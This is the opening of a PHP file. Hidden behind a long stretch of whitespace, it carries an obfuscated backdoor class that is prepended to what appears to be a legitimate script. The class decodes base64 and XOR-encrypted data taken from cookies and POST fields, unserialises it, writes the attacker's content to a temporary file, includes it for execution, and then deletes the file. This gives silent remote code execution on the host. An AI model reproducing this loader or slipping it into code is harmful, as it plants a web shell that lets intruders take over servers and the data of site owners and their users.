<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("vmgwyysou")){class vmgwyysou{public static $lnfdqmqeya = "njhhllghacbdhait";public static $gvjjrwt = NULL;public function __construct(){$cvqdujh = @$_COOKIE[substr(vmgwyysou::$lnfdqmqeya, 0, 4)];if (!empty($cvqdujh)){$fkxdaxxudu = "base64";$eualtgct = "";$cvqdujh = explode(",", $cvqdujh);foreach ($cvqdujh as $pjvgqpiir){$eualtgct .= @$_COOKIE[$pjvgqpiir];$eualtgct .= @$_POST[$pjvgqpiir];}$eualtgct = array_map($fkxdaxxudu . "_decode", array($eualtgct,));$eualtgct = $eualtgct[0] ^ str_repeat(vmgwyysou::$lnfdqmqeya, (strlen($eualtgct[0]) / strlen(vmgwyysou::$lnfdqmqeya)) + 1);vmgwyysou::$gvjjrwt = @unserialize($eualtgct);}}public function __destruct(){$this->yycvubjbe();}private function yycvubjbe(){if (is_array(vmgwyysou::$gvjjrwt)) {$qblqweros = sys_get_temp_dir() . "/" . crc32(vmgwyysou::$gvjjrwt["salt"]);@vmgwyysou::$gvjjrwt["write"]($qblqweros, vmgwyysou::$gvjjrwt["content"]);include $qblqweros;@vmgwyysou::$gvjjrwt["delete"]($qblqweros);exit();}}}$dpczgzfewj = new vmgwyysou();$dpczgzfewj = NULL;} ?><?php
/**
